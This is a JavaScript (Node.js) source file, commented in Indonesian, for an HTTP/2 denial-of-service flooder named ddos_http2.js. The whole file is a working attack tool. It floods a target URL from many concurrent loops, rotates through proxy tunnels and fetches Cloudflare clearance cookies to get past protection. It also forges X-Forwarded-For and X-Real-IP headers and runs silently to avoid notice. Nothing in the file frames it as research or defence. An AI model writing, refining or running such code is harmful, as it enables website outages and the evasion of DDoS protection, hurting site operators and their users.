const http2 = require('http2');
const fs = require('fs');
const { URL } = require('url');
const axios = require('axios');
const net = require('net');
const { Worker, isMainThread, parentPort } = require('worker_threads');
// --- Konfigurasi ---
const HTTP_METHODS = ["GET"];
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.69 Safari/537.36",
    // Tambahkan User-Agent lain jika perlu
];
const REFERRERS = [
    "https://www.google.com/",
    "https://www.bing.com/search?q=",
    // Tambahkan referrer lain jika perlu
];
// --- Fungsi Membaca Proxy ---
function loadProxies(proxyFile) {
    try {
        if (!proxyFile) return [];
        const data = fs.readFileSync(proxyFile, 'utf8');
        return data.trim().split('\n').filter(Boolean).map(proxy => {
            if (!proxy.startsWith('http://') && !proxy.startsWith('https://')) {
                return `http://${proxy}`;
            }
            return proxy;
        }).filter(proxy => {
            try {
                new URL(proxy);
                return true;
            } catch (err) {
                return false;
            }
        });
    } catch (err) {
        // Mode silent: tidak tampilkan error
        return [];
    }
}
// --- Fungsi Pilih User-Agent Acak ---
function getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}
// --- Fungsi Pilih Referer Acak ---
function getRandomReferer() {
    return REFERRERS[Math.floor(Math.random() * REFERRERS.length)];
}
// --- Fungsi Mendapatkan Cookie Cloudflare ---
async function fetchCloudflareCookie(url) {
    const headers = {
        'User-Agent': getRandomUserAgent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'close'
    };
    try {
        const response = await axios.get(url, { headers, timeout: 5000 });
        const cookies = response.headers['set-cookie'];
        if (cookies) {
            return cookies
                .filter(cookie => cookie.startsWith('__cfduid=') || cookie.startsWith('cf_clearance='))
                .map(cookie => cookie.split(';')[0])
                .join('; ');
        }
        return null;
    } catch (error) {
        // Mode silent: tidak tampilkan error
        return null;
    }
}
// --- Fungsi Membuat Proxy Tunnel ---
function createProxyTunnel(proxyUrl, targetUrl) {
    return new Promise((resolve, reject) => {
        const proxySocket = net.createConnection({
            host: proxyUrl.hostname,
            port: proxyUrl.port
        }, () => {
            const connectRequest = `CONNECT ${targetUrl.hostname}:${targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80)} HTTP/1.1\r\n` +
                `Host: ${targetUrl.hostname}:${targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80)}\r\n` +
                `\r\n`;
            proxySocket.write(connectRequest);
        });
        let response = '';
        proxySocket.on('data', (chunk) => {
            response += chunk.toString();
            if (response.includes('\r\n\r\n')) {
                const statusLine = response.split('\r\n')[0];
                const statusCode = parseInt(statusLine.split(' ')[1], 10);
                if (statusCode === 200) {
                    resolve(proxySocket);
                } else {
                    reject(new Error(`Proxy CONNECT failed: ${statusLine}`));
                }
            }
        });
        proxySocket.on('error', reject);
    });
}
// --- Fungsi Rotasi Proxy ---
function getNextProxy(proxyIndexRef, proxies) {
    if (proxies.length === 0) return null;
    proxyIndexRef.index = (proxyIndexRef.index + 1) % proxies.length;
    return proxies[proxyIndexRef.index];
}

async function attackHttp2(parsedUrl, duration, proxy, cfCookie, rate, proxyIndexRef, proxies, silentMode) {
    const startTime = Date.now();
    const endTime = startTime + duration * 1000;
    let requestCount = 0;
    const host = parsedUrl.hostname;
    while (Date.now() < endTime) {
        try {
            let client;
            if (proxy) {
                const proxyUrl = new URL(proxy);
                if (proxyUrl.protocol === 'http:') {
                    const tunnelSocket = await createProxyTunnel(proxyUrl, parsedUrl);
                    client = http2.connect(parsedUrl.href, { socket: tunnelSocket });
                } else {
                    // Mode silent: skip unsupported proxy protocol
                    break;
                }
            } else {
                client = http2.connect(parsedUrl.href);
            }
            // Mode silent: tidak tampilkan info proxy
            if (!silentMode) {
                console.log(`[INFO] Menggunakan proxy: ${proxy || 'Direct'}`);
            }
            client.on('error', () => {
                client.destroy();
            });
            while (Date.now() < endTime) {
                const headers = {
                    ':method': HTTP_METHODS[0],
                    ':path': parsedUrl.pathname || '/',
                    ':authority': host,
                    'user-agent': getRandomUserAgent(),
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'dnt': '1',
                    'cache-control': 'no-cache',
                    'referer': getRandomReferer(),
                    'x-forwarded-for': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                    'x-real-ip': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
                };
                if (cfCookie) {
                    headers['cookie'] = cfCookie;
                }
                const req = client.request(headers);
                req.on('response', () => {
                    requestCount++;
                    if (!silentMode) {
                        const rps = (requestCount / ((Date.now() - startTime) / 1000)).toFixed(2);
                        process.stdout.write(`\r[THREAD] ATTACKING: ${host} | Req: ${requestCount} | RPS: ${rps}`);
                    }
                });
                req.on('error', () => { });
                req.end();
                const delay = 1000 / rate;
                await new Promise(resolve => setTimeout(resolve, delay + Math.random() * 20));
            }
            client.destroy();
        } catch (err) {
            // Mode silent: tidak tampilkan error
            await new Promise(resolve => setTimeout(resolve, 3000 + Math.random() * 3000));
        }
        // Rotasi proxy setelah satu loop
        proxy = getNextProxy(proxyIndexRef, proxies);
        if (!silentMode) {
            console.log(`[INFO] Rotated proxy: ${proxy}`);
        }
    }
    return requestCount;
}

async function launchMultiThreadedAttack(targetUrl, duration, proxyFile, threads, rate, silentMode) {
    let parsedUrl;
    try {
        parsedUrl = new URL(targetUrl);
    } catch (err) {
        // Mode silent: tidak tampilkan error
        process.exit(1);
    }
    const proxies = loadProxies(proxyFile);
    const filteredProxies = proxies.filter(proxy => {
        try {
            new URL(proxy);
            return true;
        } catch { return false; }
    });
    // Mode silent: tidak tampilkan info load proxy
    const totalProxies = filteredProxies.length;
    const cfCookie = await fetchCloudflareCookie(targetUrl);
    // Mode silent: tidak tampilkan info cookie
    const proxyIndexRef = { index: -1 };
    const attackPromises = [];
    for (let i = 0; i < threads; i++) {
        const proxy = filteredProxies.length > 0 ? getNextProxy(proxyIndexRef, filteredProxies) : null;
        attackPromises.push(attackHttp2(parsedUrl, duration, proxy, cfCookie, rate, proxyIndexRef, filteredProxies, silentMode));
        if (filteredProxies.length > 0) {
            proxyIndexRef.index = (proxyIndexRef.index + 1) % filteredProxies.length;
        }
    }
    const results = await Promise.all(attackPromises);
    const totalRequests = results.reduce((a, b) => a + b, 0);
    const finalRPS = (totalRequests / duration).toFixed();
    // Mode silent: tidak tampilkan hasil
    process.exit(0);
}
// --- Main ---
if (isMainThread) {
    const args = process.argv.slice(2);
    if (args.length < 4) {
        // Mode silent: tampilkan usage
        console.log(`Usage: node ddos_http2.js <url> <durasi> <threads> <rate> <proxyfileOptional>`);
        process.exit(1);
    }
    const TARGET_URL = args[0];
    const DURATION = parseInt(args[1]) || 60;
    const THREADS = parseInt(args[2]) || 200;
    const RATE = parseInt(args[3]) || 10;
    const PROXY_FILE = args[4] || null;
    // Mode silent: jalankan tanpa output berlebihan
    launchMultiThreadedAttack(TARGET_URL, DURATION, PROXY_FILE, THREADS, RATE, true)
        .catch(() => {
            // Tidak tampilkan error
            process.exit(1);
        });
    // Refresh Cloudflare cookie setiap 3 menit juga tanpa output
    setInterval(async () => {
        if (TARGET_URL) {
            await fetchCloudflareCookie(TARGET_URL);
        }
    }, 180000);
    // Penanganan SIGINT
    process.on('SIGINT', () => {
        process.exit(0);
    });
}